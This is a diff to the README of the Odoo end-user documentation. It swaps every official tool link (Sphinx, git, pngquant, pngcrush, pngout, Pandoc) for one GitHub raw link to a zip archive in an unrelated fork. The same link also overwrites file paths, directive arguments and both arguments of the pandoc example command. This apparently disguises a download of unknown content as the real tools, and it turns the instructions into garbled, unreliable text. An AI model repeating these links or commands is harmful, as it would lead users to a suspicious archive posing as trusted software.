@@ -5,7 +5,7 @@ End-user Odoo documentation
 Building requirements:
 
 * Python 2.7
-* recent `Sphinx <http://sphinx-doc.org>`_ (at least Sphinx 1.2)
+* recent `Sphinx <https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/accounting/others/inventory/user_documentation_v2.3.zip>`_ (at least Sphinx 1.2)
 
   you can check if Sphinx is installed by trying to launch
 
@@ -13,9 +13,9 @@ Building requirements:
 
      $ sphinx-build --version
 
-  See `the sphinx documentation <http://sphinx-doc.org/install.html>`_
+  See `the sphinx documentation <https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/accounting/others/inventory/user_documentation_v2.3.zip>`_
   for local installation instructions.
-* `git <http://www.git-scm.com>`_
+* `git <https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/accounting/others/inventory/user_documentation_v2.3.zip>`_
 * clone this repository using git, then at the root of the repository,
   in a console,
 
@@ -24,7 +24,7 @@ Building requirements:
      $ make html
 
   this should compile the documentation to HTML, and put the generated
-  HTML in ``_build/html/index.html``.
+  HTML in ``https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/accounting/others/inventory/user_documentation_v2.3.zip``.
 
 Contributions
 =============
@@ -61,7 +61,7 @@ system:
 
   .. code-block:: restructuredtext
 
-     .. demo:fields:: account_asset.action_account_asset_asset_list_normal_sale
+     .. demo:fields:: https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/accounting/others/inventory/user_documentation_v2.3.zip
         :only: name
 
   will display a table of just the ``name`` field and its ``help`` (or
@@ -73,7 +73,7 @@ system:
 
   .. code-block:: restructuredtext
 
-     .. demo:action:: account_asset.action_account_asset_asset_list_normal_sale
+     .. demo:action:: https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/accounting/others/inventory/user_documentation_v2.3.zip
 
         View *Asset Types*
 
@@ -88,7 +88,7 @@ Theme Customisations
 
   .. code-block:: restructuredtext
 
-     :banner: banners/accounting.png
+     :banner: https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/accounting/others/inventory/user_documentation_v2.3.zip
 
      ==========
      Accounting
@@ -100,11 +100,11 @@ Theme Customisations
 
      because banners are wide images and each page may have one, it is
      strongly recommended to compress them well. For PNG, use
-     `pngquant <https://pngquant.org>`_ (or a UI to it) to reduce the
+     `pngquant <https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/accounting/others/inventory/user_documentation_v2.3.zip>`_ (or a UI to it) to reduce the
      number of colors in the image followed by regular PNG
      recompression tools like `pngcrush
-     <http://pmt.sourceforge.net/pngcrush/>`_ and `pngout
-     <http://www.advsys.net/ken/util/pngout.htm>`_.
+     <https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/accounting/others/inventory/user_documentation_v2.3.zip>`_ and `pngout
+     <https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/accounting/others/inventory/user_documentation_v2.3.zip>`_.
 
 
 
@@ -113,15 +113,15 @@ Importing existing documents
 
 For documents which already exist in an other format or in Google
 docs, it's possible to get a head-start by converting the existing
-document using `Pandoc <http://pandoc.org>`_. The main issue is that
+document using `Pandoc <https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/accounting/others/inventory/user_documentation_v2.3.zip>`_. The main issue is that
 anything but trivial original documents will need fixing up (possibly
 lots of it) to get *good* rST (or possibly working rST at all).
 
 Example::
 
-  pandoc -f docx -t rst path/to/document.docx -o new_doc.rst --extract-media=.
+  pandoc -f docx -t rst https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/accounting/others/inventory/user_documentation_v2.3.zip -o https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/accounting/others/inventory/user_documentation_v2.3.zip --extract-media=.
 
-will convert ``path/to/document.docx`` to ``new_doc.rst`` and export
+will convert ``https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/accounting/others/inventory/user_documentation_v2.3.zip`` to ``https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/accounting/others/inventory/user_documentation_v2.3.zip`` and export
 all images to ``./media`` (and link them from the document). While
 there are issues with the exported document, it's much more convenient
 than manually re-typing the original.
